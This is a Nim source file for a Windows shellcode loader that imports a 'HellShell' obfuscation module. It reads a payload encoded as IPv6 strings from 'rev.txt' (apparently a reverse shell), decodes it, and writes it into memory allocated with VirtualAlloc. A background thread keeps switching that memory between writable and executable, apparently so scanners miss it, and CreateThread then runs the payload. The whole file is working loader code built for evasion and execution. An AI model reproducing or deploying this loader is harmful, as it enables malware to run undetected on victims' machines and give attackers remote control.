import winim/lean
import src/HellShellpkg/obfuscation

type 
    task = proc(): void {.closure, gcsafe.}

var tasks: Channel[task]

proc permissionSpin(pMemory: LPVOID, length: uint) {.thread.} =
    var 
        oldProtect = DWORD(0)
        success: WINBOOL
    while true:
        success = VirtualProtect(pMemory, SIZE_T length, PAGE_EXECUTE_READWRITE, addr oldProtect)
        if success == FALSE:
            echo "[-] Failed to change permissions: ", GetLastError()
            break
        #echo "[+] Changed permissions to PAGE_EXECUTE_READWRITE"
        let tried = tasks.tryRecv()
        if tried.dataAvailable:
            echo "[+] Received Payload"
            Sleep(100)
            tried.msg()
            Sleep(100)
        success = VirtualProtect(pMemory, SIZE_T length, oldProtect, addr oldProtect)
        if success == FALSE:
            echo "[-] Failed to change permissions back: ", GetLastError()
            break


if isMainModule:
    var 
        # Alloc Memory
        allocSpace = VirtualAlloc(nil, 0x1000, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
        spinner: Thread[void]
    if allocSpace == nil:
        echo "[-] Failed to allocate memory: ", GetLastError()
    echo "[+] Allocated memory at: ", cast[int](allocSpace).toHex
    var anon = proc() =
        permissionSpin(allocSpace, 0x1000)
    tasks.open()
    createThread(spinner, anon)
    echo "[+] Created Thread for permissionSpin"
    Sleep(500)
    echo "[*] Sending Payload to permissionSpin"
    
    var sliding = allocSpace
    for section in "rev.txt".lines:
        echo section
        var payloadPiece = section.fromIPv6
        echo payloadPiece, " - ", payloadPiece.len
        tasks.send(proc() {.gcsafe.} =
            {.cast(gcsafe).}: copyMem(sliding, addr payloadPiece[0], payloadPiece.len)
            {.cast(gcsafe).}: sliding = cast[LPVOID](cast[int](sliding) + payloadPiece.len)
            echo "[+] Wrote payload"
        )
        Sleep(500)
    echo "[+] Finished sending payload to permissionSpin. Press enter to create thread..."
    discard stdin.readLine()
    tasks.send(proc(): void = 
        CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](allocSpace), nil, 0, nil)
        echo "[+] Started Thread"
    )
    discard stdin.readLine()
